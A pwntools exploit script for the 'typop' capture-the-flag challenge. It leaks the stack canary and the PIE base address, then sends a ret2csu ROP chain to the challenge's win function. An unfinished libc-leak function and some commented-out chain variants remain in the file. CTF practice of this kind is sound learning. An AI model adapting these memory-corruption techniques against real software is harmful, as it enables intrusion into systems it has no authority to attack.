#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *win+99
        b *win
        b *getFeedback+199
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("typop.chal.idek.team", 1337)
    else:
        return process(binary)


def leak_base(p,e,r, canary):

    pad = b"A" * 10
    # Get base address of the binary
    log.info("Leaking binary base")
    pause()
    p.sendline(b"y")
    p.sendline(b"y"*25)
    p.recvuntil(b"y\n")
    leak = p.recvline().strip()
    leak_arr = list(bytearray(leak))
    base_arr = []
    for i in leak_arr:
        base_arr.insert(0, hex(i).split("0x")[1])

    leak_addr = "0x" + "".join(base_arr)

    base_addr = int(leak_addr, 16) - 0x1447
    log.info(f"Resolved base address: {hex(base_addr)}")

    e.address = base_addr

    p.sendline(pad + canary)


    return base_addr

def leak_libc(p, e, r, canary, base_addr):
    pad = b"A" * 10
    #hain = p64( 

    log.info("Leaking libc")
    pause()
    p.sendline("y")

    p.sendline("y"*25)
    p.recvuntil(b"y\n")



def exploit(p, e, r, canary, base_addr):
    pad = b"A" * 10
    pause()
    p.sendline(b"y")
    p.sendline(b"y")
    csu_gadget1 = base_addr + 0x14ca
    csu_gadget2 = base_addr + 0x14b0
    got_deref = base_addr + 0x3fb8
    fini = base_addr + 0x3db0
    fini = base_addr + 0x1442
    log.info(f"CSU Gadget 1: {hex(csu_gadget1)}")
    log.info(f"CSU Gadget 2: {hex(csu_gadget2)}")

    ret = base_addr + 0x14d4
    pop_rdi = base_addr + 0x14d3
    string = base_addr + 0x2051
    puts_plt = e.plt["puts"]
    puts_got = e.got["puts"]
    getchar_got = e.got["getchar"]
    read_got = e.got["read"]
    #pop_rsi_r15 = base_addr + 0x14d1 
    #win = base_addr + 0x12ac
    win = e.sym["win"]

    log.info(f"Win: {hex(win)}")

    chain = canary + p64(1)
    chain += p64(csu_gadget1) + p64(0) + p64(1)
    chain += p64(ord("f")) + p64(ord("l")) + p64(ord("a")) + p64(got_deref)
    chain += p64(csu_gadget2) + p64(0) * 7
    chain += p64(win)

    #chain += p64(ret) + p64(win)
    #jchain += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
    #chain += p64(pop_rdi) + p64(getchar_got) + p64(puts_plt)
    #chain += p64(pop_rdi) + p64(read_got) + p64(puts_plt)

    print(f"Chain Length {len(pad+chain)}")
    p.sendline(pad + chain)
    p.interactive()
    #puts_leak = p.recvline()
    #getchar_leak = p.recvline()
    #read_leak = p.recvline()



def leak_canary(p,e,r):
    log.info("Leaking canary")
    pad = b"A" * 10

    p.sendline(b"y")
    p.sendline(pad)
    p.recvuntil(b"You said:")
    p.recvline()
    leak = p.recvline().strip()
    test = list(bytearray(leak))[0:7]
    test.insert(0, 0)
    canary = bytes(test)
    log.info(f"Received Canary Leak: {canary}")

    p.sendline(pad+canary)

    return canary

if __name__=="__main__":
    file = './chall'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    canary = leak_canary(p,e,r)
    base = leak_base(p,e,r, canary)
    exploit(p, e, r, canary, base)
